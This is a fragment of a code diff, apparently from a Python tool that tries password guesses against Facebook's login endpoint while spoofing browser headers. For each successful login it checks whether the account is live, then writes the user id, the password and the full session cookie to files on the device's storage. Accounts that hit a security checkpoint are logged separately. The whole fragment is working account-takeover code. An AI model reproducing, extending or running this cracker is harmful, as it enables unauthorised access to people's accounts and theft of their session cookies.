+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            'viewport-width': '995',}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/login/device-based/regular/login/'
+            po = Session.post(url, cookies=cookies, headers=headers, data=data).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
